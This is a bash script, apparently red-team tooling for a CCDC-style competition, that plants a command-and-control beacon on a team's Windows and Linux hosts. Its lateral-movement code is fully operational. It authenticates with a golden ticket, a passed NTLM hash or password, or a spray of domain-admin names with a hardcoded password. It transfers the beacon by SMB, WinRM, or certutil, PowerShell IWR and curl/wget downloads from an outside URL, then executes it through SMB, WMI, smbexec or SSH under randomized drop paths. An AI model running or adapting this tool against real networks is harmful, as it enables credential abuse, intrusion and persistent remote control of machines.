#!/bin/bash
# ================================================
# CCDC Beacon Planter
# Usage: ./planter.sh <team> [host] [-p pass_or_hash] [-u user] [-w URL] [-x]
#
#   Finds the first .exe in CWD and plants it on target(s).
#   Auth priority: golden ticket (team<N>.ccache) → -p cred → spray DA list
#   Transfer: SMB put → WMI copy → WinRM upload → certutil from URL → powershell IWR from URL
#   Exec order: SMB → WinRM → WMI → smbexec → SSH (for Linux boxes)
#   Drop paths: random temp name → C:\Windows\Temp → C:\ProgramData → %TEMP%
#
#   host  → hostname, number 1-7, or omit for ALL boxes
#   -p    → password or NTLM hash (overrides golden ticket)
#   -u    → user (default: Administrator)
#   -w    → fallback HTTP URL for beacon download if file transfer fails
#           (e.g. http://10.0.0.5:8080/beacon.exe) — paste later if needed
#   -x    → use internal 172.16.x.x IPs (through proxychains)
# ================================================

set -uo pipefail

usage() {
  echo "Usage: $0 <team> [host] [-p password_or_hash] [-u user] [-w http_url] [-x]"
  echo ""
  echo "  host can be:"
  echo "    hostname  — curiosity, morality, intelligence, anger, fact, space, adventure"
  echo "    number    — 1-7 (or omit to target ALL boxes)"
  echo ""
  echo "Flags:"
  echo "  -p PASS  password or NTLM hash"
  echo "  -u USER  specify user (default: Administrator)"
  echo "  -w URL   fallback HTTP URL to download beacon if file xfer fails"
  echo "  -x       use internal 172.16.x.x IPs (via proxychains)"
  echo ""
  echo "Examples:"
  echo "  $0 5                               # plant on all boxes (golden ticket auto)"
  echo "  $0 5 1                             # plant on curiosity only"
  echo "  $0 5 anger -p Th3cake1salie!"
  echo "  $0 5 -w http://10.0.0.5:8080/b.exe"
  exit 1
}

# ====================== PARSE ARGS ======================
if [[ $# -lt 1 ]]; then usage; fi

TEAM="$1"; shift
if [[ -z "$TEAM" || ! "$TEAM" =~ ^[0-9]+$ ]]; then usage; fi

DOMAIN="aperturesciencelabs.org"
PASS=""
USER_OVERRIDE=""
BEACON_URL=""
TARGET_ARG=""
TIMEOUT=2
USE_INTERNAL=0

# Grab optional positional host arg (before flags)
if [[ $# -gt 0 && "$1" != -* ]]; then
  TARGET_ARG="$1"; shift
fi

while getopts "p:u:w:x" opt; do
  case "$opt" in
    p) PASS="$OPTARG" ;;
    u) USER_OVERRIDE="$OPTARG" ;;
    w) BEACON_URL="$OPTARG" ;;
    x) USE_INTERNAL=1 ;;
    *) usage ;;
  esac
done

# ====================== HOST MAPPING ======================
declare -A NUM_HOST=(
  [1]="curiosity" [2]="morality" [3]="intelligence"
  [4]="anger" [5]="fact" [6]="space" [7]="adventure"
)
declare -A HOST_OCTET=(
  ["curiosity"]=140  ["morality"]=10  ["intelligence"]=11
  ["anger"]=70       ["fact"]=71      ["space"]=141
  ["adventure"]=72
)
declare -A HOST_INTERNAL=(
  ["curiosity"]="172.16.3.140"   ["morality"]="172.16.1.10"
  ["intelligence"]="172.16.1.11" ["anger"]="172.16.2.70"
  ["fact"]="172.16.2.71"         ["space"]="172.16.3.141"
  ["adventure"]="172.16.2.72"
)
HOST_ORDER=(curiosity morality intelligence anger fact space adventure)

# ====================== RESOLVE TARGETS ======================
TARGETS=()
if [[ -z "$TARGET_ARG" ]]; then
  for h in "${HOST_ORDER[@]}"; do
    TARGETS+=("$h")
  done
elif [[ "$TARGET_ARG" =~ ^[1-7]$ ]]; then
  TARGETS+=("${NUM_HOST[$TARGET_ARG]}")
elif [[ -n "${HOST_OCTET[$TARGET_ARG]:-}" ]]; then
  TARGETS+=("$TARGET_ARG")
else
  echo "[-] Unknown host: '$TARGET_ARG'"
  exit 1
fi

# ====================== FIND BEACON EXE ======================
BEACON_FILE=""
for f in *.exe; do
  if [[ -f "$f" ]]; then
    BEACON_FILE="$f"
    break
  fi
done

if [[ -z "$BEACON_FILE" ]]; then
  echo "[!] No .exe found in current directory"
  if [[ -z "$BEACON_URL" ]]; then
    echo "[-] No beacon file and no -w URL specified. Nothing to plant."
    exit 1
  fi
  echo "[*] Will rely on -w URL download only: $BEACON_URL"
fi

BEACON_NAME="${BEACON_FILE:-beacon.exe}"
echo "[+] Beacon : ${BEACON_FILE:-'(remote URL only)'}"
echo "[+] Targets: ${TARGETS[*]}"

# ====================== AUTH SETUP ======================
# Priority: golden ticket → explicit -p creds → spray DA list
# If golden ticket exists but fails auth, automatically falls back to password spray
DA_USERS=(Administrator caroline cave chell glados wheatley)
TICKET="team${TEAM}.ccache"
USE_KERBEROS=0
AUTH_FLAG=""
SPRAY_MODE=0
FALLBACK_PASS="Th3cake1salie!"

if [[ -z "$PASS" && -f "$TICKET" ]]; then
  echo "[+] Auth   : golden ticket ($TICKET) — will fallback to password spray if ticket fails"
  export KRB5CCNAME="$(pwd)/${TICKET}"
  USE_KERBEROS=1
  [[ -z "$USER_OVERRIDE" ]] && USER_OVERRIDE="Administrator"
elif [[ -n "$PASS" ]]; then
  # Detect hash vs password
  if [[ "$PASS" =~ ^[0-9a-fA-F]{32}(:[0-9a-fA-F]{32})?$ ]]; then
    AUTH_FLAG="-H"
    echo "[+] Auth   : hash"
  else
    AUTH_FLAG="-p"
    echo "[+] Auth   : password"
  fi
  [[ -z "$USER_OVERRIDE" ]] && USER_OVERRIDE="Administrator"
else
  echo "[+] Auth   : spray mode (DA accounts + users.txt, default pass)"
  SPRAY_MODE=1
  PASS="$FALLBACK_PASS"
  AUTH_FLAG="-p"
fi

# Build user list for spray mode AND for fallback
ALL_USERS=()
SPRAY_USERS=()

# Always build the spray user list (used as fallback if kerberos fails)
for u in "${DA_USERS[@]}"; do SPRAY_USERS+=("$u"); done
if [[ -f "users.txt" ]]; then
  while IFS= read -r u || [[ -n "$u" ]]; do
    [[ -z "$u" ]] && continue
    already=0
    for da in "${DA_USERS[@]}"; do
      [[ "${u,,}" == "${da,,}" ]] && { already=1; break; }
    done
    [[ $already -eq 0 ]] && SPRAY_USERS+=("$u")
  done < "users.txt"
fi

if [[ $SPRAY_MODE -eq 1 ]]; then
  ALL_USERS=("${SPRAY_USERS[@]}")
  echo "[+] Spray  : ${#ALL_USERS[@]} users"
elif [[ $USE_KERBEROS -eq 1 ]]; then
  ALL_USERS=("$USER_OVERRIDE")
  echo "[+] Fallback users: ${#SPRAY_USERS[@]} (if ticket fails)"
else
  ALL_USERS=("$USER_OVERRIDE")
fi

echo ""

# ====================== HELPERS ======================
port_open() {
  local ip="$1" port="$2"
  timeout "$TIMEOUT" bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
}

# Generate a random-looking drop path (Windows)
random_drop_path() {
  local rnd=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
  local bases=(
    "C:\\Windows\\Temp\\svc${rnd}.exe"
    "C:\\ProgramData\\${rnd}.exe"
    "C:\\Windows\\System32\\Tasks\\${rnd}.exe"
  )
  echo "${bases[$((RANDOM % ${#bases[@]}))]}"
}

# Guaranteed-writable fallback paths in priority order
SAFE_PATHS=(
  'C:\Windows\Temp'
  'C:\ProgramData'
  '%TEMP%'
)

# ====================== NXC AUTH ARGS ======================
# Builds the auth portion of a netexec command for a given user
nxc_auth() {
  local user="$1"
  if [[ $USE_KERBEROS -eq 1 ]]; then
    echo "-u '$user' -d '$DOMAIN' -k"
  else
    echo "-u '$user' -d '$DOMAIN' $AUTH_FLAG '$PASS'"
  fi
}

# ====================== TRANSFER METHODS ======================
# Each returns 0 on success. They set REMOTE_PATH on success.

REMOTE_PATH=""

# Method 1: SMB put via smbclient then exec
transfer_smb_put() {
  local ip="$1" user="$2" dest="$3"
  [[ -z "$BEACON_FILE" ]] && return 1
  port_open "$ip" 445 || return 1

  local dest_dir dest_base share rel_path
  dest_base="$(basename "$dest")"

  # Try C$ admin share
  if [[ "$dest" == C:\\Windows\\Temp\\* || "$dest" == C:\\ProgramData\\* ]]; then
    rel_path="${dest#C:\\}"
    rel_path="${rel_path//\\/\/}"
    share="C\$"
  else
    share="C\$"
    rel_path="Windows/Temp/${dest_base}"
    dest="C:\\Windows\\Temp\\${dest_base}"
  fi

  local out
  if [[ $USE_KERBEROS -eq 1 ]]; then
    out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k \
      --put-file "$BEACON_FILE" "$rel_path" 2>&1)
  else
    out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" \
      --put-file "$BEACON_FILE" "$rel_path" 2>&1)
  fi

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  return 1
}

# Method 2: WinRM upload + write via PowerShell
transfer_winrm() {
  local ip="$1" user="$2" dest="$3"
  [[ -z "$BEACON_FILE" ]] && return 1
  port_open "$ip" 5985 || return 1

  # base64-encode the file for inline transfer
  local b64
  b64=$(base64 -w0 "$BEACON_FILE" 2>/dev/null || base64 "$BEACON_FILE" 2>/dev/null)
  [[ -z "$b64" ]] && return 1

  # PowerShell to decode and write
  local ps_cmd="[IO.File]::WriteAllBytes('${dest}',[Convert]::FromBase64String('${b64}'))"

  local out
  if [[ $USE_KERBEROS -eq 1 ]]; then
    out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k \
      -X "$ps_cmd" 2>&1)
  else
    out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" \
      -X "$ps_cmd" 2>&1)
  fi

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  return 1
}

# Method 3: Download from URL via certutil (executed over any working proto)
transfer_url_certutil() {
  local ip="$1" user="$2" dest="$3" proto="$4"
  [[ -z "$BEACON_URL" ]] && return 1

  local cmd="certutil -urlcache -split -f \"${BEACON_URL}\" \"${dest}\""
  local out

  case "$proto" in
    smb)
      port_open "$ip" 445 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
      else
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
      fi
      ;;
    winrm)
      port_open "$ip" 5985 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
      else
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
      fi
      ;;
    wmi)
      port_open "$ip" 135 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
      else
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
      fi
      ;;
    *) return 1 ;;
  esac

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  return 1
}

# Method 4: Download from URL via PowerShell IWR
transfer_url_iwr() {
  local ip="$1" user="$2" dest="$3" proto="$4"
  [[ -z "$BEACON_URL" ]] && return 1

  local ps_cmd="powershell -NoP -NonI -c \"IWR -Uri '${BEACON_URL}' -OutFile '${dest}'\""
  local out

  case "$proto" in
    smb)
      port_open "$ip" 445 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$ps_cmd" 2>&1)
      else
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$ps_cmd" 2>&1)
      fi
      ;;
    winrm)
      port_open "$ip" 5985 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -X "$ps_cmd" 2>&1)
      else
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -X "$ps_cmd" 2>&1)
      fi
      ;;
    wmi)
      port_open "$ip" 135 || return 1
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$ps_cmd" 2>&1)
      else
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$ps_cmd" 2>&1)
      fi
      ;;
    *) return 1 ;;
  esac

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  return 1
}

# ====================== EXECUTE BEACON ======================
exec_beacon() {
  local ip="$1" user="$2" path="$3"
  local cmd="start /b \"\" \"${path}\""
  local out ok=1

  # Try SMB
  if port_open "$ip" 445; then
    if [[ $USE_KERBEROS -eq 1 ]]; then
      out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
    else
      out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
    fi
    echo "$out" | grep -qi '\[+\]' && return 0
  fi

  # Try WinRM
  if port_open "$ip" 5985; then
    if [[ $USE_KERBEROS -eq 1 ]]; then
      out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
    else
      out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
    fi
    echo "$out" | grep -qi '\[+\]' && return 0
  fi

  # Try WMI
  if port_open "$ip" 135; then
    if [[ $USE_KERBEROS -eq 1 ]]; then
      out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
    else
      out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
    fi
    echo "$out" | grep -qi '\[+\]' && return 0
  fi

  # Try smbexec
  local smbexec_bin
  smbexec_bin=$(command -v smbexec.py 2>/dev/null || command -v impacket-smbexec 2>/dev/null || echo "")
  if [[ -n "$smbexec_bin" ]] && port_open "$ip" 445; then
    if [[ "$AUTH_FLAG" == "-H" ]]; then
      out=$("$smbexec_bin" "${DOMAIN}/${user}@${ip}" -hashes "$PASS" -c "$cmd" 2>&1)
    elif [[ $USE_KERBEROS -eq 1 ]]; then
      out=$("$smbexec_bin" "${DOMAIN}/${user}@${ip}" -k -no-pass -c "$cmd" 2>&1)
    else
      out=$("$smbexec_bin" "${DOMAIN}/${user}:${PASS}@${ip}" -c "$cmd" 2>&1)
    fi
    echo "$out" | grep -qiv 'error\|failed\|refused\|denied' && return 0
  fi

  # Try SSH (Linux boxes — just chmod +x and run in bg)
  if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" ]]; then
    local ssh_cmd="chmod +x /tmp/${BEACON_NAME} 2>/dev/null; nohup /tmp/${BEACON_NAME} &>/dev/null &"
    out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$ssh_cmd" 2>&1)
    echo "$out" | grep -qi '\[+\]' && return 0
  fi

  return 1
}

# ====================== TRANSFER + EXEC ON ONE HOST ======================
plant_on_host() {
  local hostname="$1"
  local ip
  if [[ $USE_INTERNAL -eq 1 ]]; then
    ip="${HOST_INTERNAL[$hostname]}"
  else
    ip="192.168.20${TEAM}.${HOST_OCTET[$hostname]}"
  fi
  local fqdn="${hostname}.${DOMAIN}"

  echo "  [*] ${hostname} (${ip})"

  # Save auth state so kerberos fallback on one host doesn't affect others
  local save_kerberos=$USE_KERBEROS
  local save_auth_flag="$AUTH_FLAG"
  local save_pass="$PASS"

  # Determine authed user — try each until one works
  local authed_user="" authed_proto=""

  for user in "${ALL_USERS[@]}"; do
    # Quick auth check via SMB → WinRM → WMI
    for proto in smb winrm wmi; do
      local port
      case "$proto" in
        smb)   port=445 ;;
        winrm) port=5985 ;;
        wmi)   port=135 ;;
      esac
      port_open "$ip" "$port" || continue

      local out
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -k 2>&1)
      else
        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" 2>&1)
      fi

      if echo "$out" | grep -qi '\[+\]'; then
        authed_user="$user"
        authed_proto="$proto"
        break 2
      fi
    done

    # Try SSH
    if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" || $SPRAY_MODE -eq 1 ]]; then
      local out
      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" 2>&1)
      if echo "$out" | grep -qi '\[+\]'; then
        authed_user="$user"
        authed_proto="ssh"
        break
      fi
    fi
  done

  # ---- Kerberos fallback: if ticket auth failed, try password spray ----
  if [[ -z "$authed_user" && $USE_KERBEROS -eq 1 ]]; then
    echo "    [!] Kerberos ticket failed — falling back to password spray"
    for user in "${SPRAY_USERS[@]}"; do
      for proto in smb winrm wmi; do
        local port
        case "$proto" in
          smb)   port=445 ;;
          winrm) port=5985 ;;
          wmi)   port=135 ;;
        esac
        port_open "$ip" "$port" || continue

        local out
        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -p "$FALLBACK_PASS" 2>&1)

        if echo "$out" | grep -qi '\[+\]'; then
          authed_user="$user"
          authed_proto="$proto"
          # Switch to password mode for transfer/exec on this host
          AUTH_FLAG="-p"
          PASS="$FALLBACK_PASS"
          USE_KERBEROS=0
          break 2
        fi
      done

      # Try SSH with password
      if port_open "$ip" 22; then
        local out
        out=$(netexec ssh "$ip" -u "$user" -p "$FALLBACK_PASS" 2>&1)
        if echo "$out" | grep -qi '\[+\]'; then
          authed_user="$user"
          authed_proto="ssh"
          AUTH_FLAG="-p"
          PASS="$FALLBACK_PASS"
          USE_KERBEROS=0
          break
        fi
      fi
    done
  fi

  if [[ -z "$authed_user" ]]; then
    echo "    [-] No valid creds found — skipping"
    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
    return 1
  fi
  echo "    [+] Auth: ${authed_user} via ${authed_proto}"

  # ---- Pick drop locations ----
  local rand_path safe_dest
  rand_path=$(random_drop_path)

  # ---- TRANSFER (try each method × each path until one works) ----
  REMOTE_PATH=""
  local transferred=0

  # Attempt 1: SMB file put (random path, then safe paths)
  for dest in "$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}"; do
    if transfer_smb_put "$ip" "$authed_user" "$dest"; then
      echo "    [+] Transferred via SMB put → $REMOTE_PATH"
      transferred=1; break
    fi
  done

  # Attempt 2: WinRM base64 upload
  if [[ $transferred -eq 0 ]]; then
    for dest in "$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}"; do
      if transfer_winrm "$ip" "$authed_user" "$dest"; then
        echo "    [+] Transferred via WinRM upload → $REMOTE_PATH"
        transferred=1; break
      fi
    done
  fi

  # Attempt 3: certutil download from URL
  if [[ $transferred -eq 0 && -n "$BEACON_URL" ]]; then
    for dest in "$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}"; do
      for proto in smb winrm wmi; do
        if transfer_url_certutil "$ip" "$authed_user" "$dest" "$proto"; then
          echo "    [+] Transferred via certutil ($proto) → $REMOTE_PATH"
          transferred=1; break 2
        fi
      done
    done
  fi

  # Attempt 4: PowerShell IWR download from URL
  if [[ $transferred -eq 0 && -n "$BEACON_URL" ]]; then
    for dest in "$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}"; do
      for proto in smb winrm wmi; do
        if transfer_url_iwr "$ip" "$authed_user" "$dest" "$proto"; then
          echo "    [+] Transferred via IWR ($proto) → $REMOTE_PATH"
          transferred=1; break 2
        fi
      done
    done
  fi

  # SSH: scp or URL-based wget/curl
  if [[ $transferred -eq 0 && "$authed_proto" == "ssh" ]]; then
    if [[ -n "$BEACON_FILE" ]]; then
      sshpass -p "$PASS" scp -o StrictHostKeyChecking=no \
        "$BEACON_FILE" "${authed_user}@${ip}:/tmp/${BEACON_NAME}" 2>/dev/null && {
        REMOTE_PATH="/tmp/${BEACON_NAME}"
        echo "    [+] Transferred via SCP → $REMOTE_PATH"
        transferred=1
      }
    fi
    if [[ $transferred -eq 0 && -n "$BEACON_URL" ]]; then
      local dl_cmd="curl -sSo /tmp/${BEACON_NAME} '${BEACON_URL}' 2>/dev/null || wget -qO /tmp/${BEACON_NAME} '${BEACON_URL}' 2>/dev/null"
      netexec ssh "$ip" -u "$authed_user" -p "$PASS" -x "$dl_cmd" 2>/dev/null && {
        REMOTE_PATH="/tmp/${BEACON_NAME}"
        echo "    [+] Transferred via URL download (SSH) → $REMOTE_PATH"
        transferred=1
      }
    fi
  fi

  if [[ $transferred -eq 0 ]]; then
    echo "    [-] All transfer methods failed — skipping"
    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
    return 1
  fi

  # ---- EXECUTE ----
  if exec_beacon "$ip" "$authed_user" "$REMOTE_PATH"; then
    echo "    [+] BEACON LAUNCHED on ${hostname}"
    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
    return 0
  else
    echo "    [-] Transfer OK but execution failed on ${hostname}"
    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
    return 1
  fi
}

# ====================== MAIN ======================
PLANTED=0
FAILED=0

echo "[*] Planting beacons on team ${TEAM}..."
echo ""

for host in "${TARGETS[@]}"; do
  if plant_on_host "$host"; then
    ((PLANTED++))
  else
    ((FAILED++))
  fi
  echo ""
done

echo "=========================================="
echo "[*] Results: ${PLANTED} planted, ${FAILED} failed out of ${#TARGETS[@]} targets"
if [[ $PLANTED -gt 0 ]]; then
  echo "[+] Check your C2 console for new beacons."
fi